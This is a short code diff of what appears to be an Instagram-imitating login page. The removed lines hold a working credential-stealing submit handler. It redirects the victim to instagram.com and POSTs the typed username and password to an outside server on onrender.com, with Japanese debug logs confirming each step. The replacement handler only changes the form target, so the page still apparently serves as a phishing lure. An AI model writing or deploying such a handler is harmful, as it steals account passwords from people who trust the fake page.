@@ -124,27 +124,15 @@ loginBtn.style.cursor = 'not-allowed';
 username.addEventListener('input', updateButton);
 password.addEventListener('input', updateButton);
 
-loginForm.addEventListener('submit', async (e) => {
- e.preventDefault(); 
-  window.location.href = 'https://www.instagram.com/';
-  console.log('🟩 ログイン押された');
-
-  await fetch('https://api-9s9o.onrender.com/login', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    username: username.value,
-    password: password.value
-    })
-  });
-
-  console.log('🟩 fetch 実行した');
+loginForm.addEventListener('submit', () => {
+  loginForm.target = '_self'; 
 });
 
 </script>
 </body>
 
 </html>
+
 
 
 
